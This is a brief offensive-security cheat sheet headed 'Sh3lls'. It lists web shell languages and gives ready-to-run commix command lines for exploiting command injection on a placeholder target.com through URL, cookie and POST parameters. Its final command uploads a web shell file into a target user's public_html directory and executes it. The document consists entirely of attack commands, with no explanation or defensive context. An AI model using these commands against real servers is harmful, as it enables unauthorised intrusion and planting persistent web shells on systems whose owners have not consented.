# Sh3lls ...

### CON:

* `php`
* `aspx`
* `js`
* `cpp`

### ANY:

* `commix`

      commix.py -u "http://target.com/post.php?id=353548" --level 3 -v 1 --random-agent --batch --all
      commix.py -u "http://target.com/post.php" --cookie="COOKIE_HERE" --level 3 -v 1 --random-agent --batch --all
      commix.py -u "http://target.com/post.php" --data="POST HERE" --level 3 -v 1 --random-agent --batch --all
      commix.py -u "http://target.com/post.php" --level 3 -v 1 --random-agent --batch --all --cookie="" --data="POST" --file-write="/opt/backbox/shell/xt4t.php" --file-dest="/home/target_user_name_here/public_html/xt4t.php" --os-cmd="php -f /home/target_user_name_here/public_html/xt4t.php"
